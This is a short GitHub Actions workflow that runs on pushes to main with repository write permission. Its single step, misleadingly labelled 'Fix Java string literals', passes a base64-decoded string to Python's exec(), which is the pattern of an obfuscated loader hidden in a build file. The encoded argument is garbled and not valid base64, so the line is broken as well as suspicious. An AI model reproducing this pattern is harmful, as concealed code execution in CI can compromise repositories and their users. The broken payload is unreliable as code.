name: Fix v1.12 build

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  fix:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fix Java string literals
        run: python -c "import base64;exec(base64.b64decode(': "?');")))"